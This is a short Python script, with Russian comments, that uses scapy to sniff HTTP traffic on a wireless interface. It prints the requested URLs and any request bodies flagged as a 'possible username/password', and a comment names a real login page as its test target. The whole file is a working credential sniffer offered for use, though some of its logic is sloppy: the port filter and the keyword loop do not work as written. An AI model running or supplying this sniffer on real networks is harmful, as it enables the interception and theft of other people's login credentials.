import scapy.all as scapy
from scapy.compat import bytes_hex
from scapy.layers import http
# http://vbsca.ca/login/login_results.asp для теста
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80" or "port 443")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    load = packet[scapy.Raw].load
    keywords = ["username", "user", "login", "password", "pass", "email"]
    decode_load_hex_string = bytes_hex(load)
    decode_load_string = bytes.fromhex(decode_load_hex_string.decode()).decode('cp1252')
    print(decode_load_string)
    for keyword in keywords:
        if "username" in decode_load_string:  # если есть совпадение - то выходим из цикла проверки текущего пакета
            return decode_load_string

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):# haslayer проверяет есть ли в трафике данные отправленные по http
        if packet.haslayer(scapy.Raw): # Raw аргумент по которому выводиться информация на нужном уровне

            url = get_url(packet)
            url_string = url.decode()
            print(f"[+] Http Request >> {url}")
            login_info = get_login_info(packet)
            if login_info:
                print(f"\n\n[+] Possible username/password> {login_info} \n\n")


sniff('wlan0')